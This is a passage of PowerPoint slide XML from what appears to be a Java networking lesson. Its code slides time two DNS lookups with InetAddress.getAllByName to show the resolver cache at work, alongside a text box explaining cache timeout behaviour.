                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>firstLookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress.getAllByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(hostname);</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long elapsed = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.currentTimeMillis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>startTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</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System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>nFirst</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> lookup (" + elapsed + " </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>):");</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for (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>firstLookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("  " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="线形标注 1 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8839200" y="792865"/>
            <a:ext cx="2781300" cy="342900"/>
          </a:xfrm>
          <a:prstGeom prst="borderCallout1">
            <a:avLst>
              <a:gd name="adj1" fmla="val 86477"/>
              <a:gd name="adj2" fmla="val 100759"/>
              <a:gd name="adj3" fmla="val 774362"/>
              <a:gd name="adj4" fmla="val -78308"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="952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600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Buffer timeout parameter</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7467600" y="4267200"/>
            <a:ext cx="4495800" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>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400" dirty="0"/>
              <a:t>After the user waits for a while, he can press any key to continue and create another </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" dirty="0"/>
              <a:t>InetAddress array using the same domain name (args[0]) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>. If the user waits for a period of time that is shorter than </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" dirty="0"/>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>cache timeout, then no matter how the situation changes, the elements in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" dirty="0"/>
              <a:t>the addresses2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" dirty="0"/>
              <a:t>addresses1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>arrays are the same, and the time it takes to create </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" dirty="0"/>
              <a:t>the addresses2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>array is generally </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" dirty="0"/>
              <a:t>0 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>milliseconds ( after less than </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" dirty="0"/>
              <a:t>1 millisecond, Java </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1400" dirty="0"/>
              <a:t>cannot obtain more accurate time).</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1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3" grpId="0" animBg="1"/>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4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="228600"/>
            <a:ext cx="11811000" cy="6247864"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCFFFF"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> // Wait for user input</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.print</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>nPress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Enter to perform second lookup...");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.in.read</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        // Second DNS lookup (should be cached if TTL &gt; 0)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>startTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.currentTimeMillis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>secondLookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress.getAllByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(hostname);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        elapsed = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.currentTimeMillis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>startTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>nSecond</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> lookup (" + elapsed + " </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>):");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        for (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>secondLookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("  " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        // Cache behavior analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>nCache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> behavior analysis:");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cacheTTL.equals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
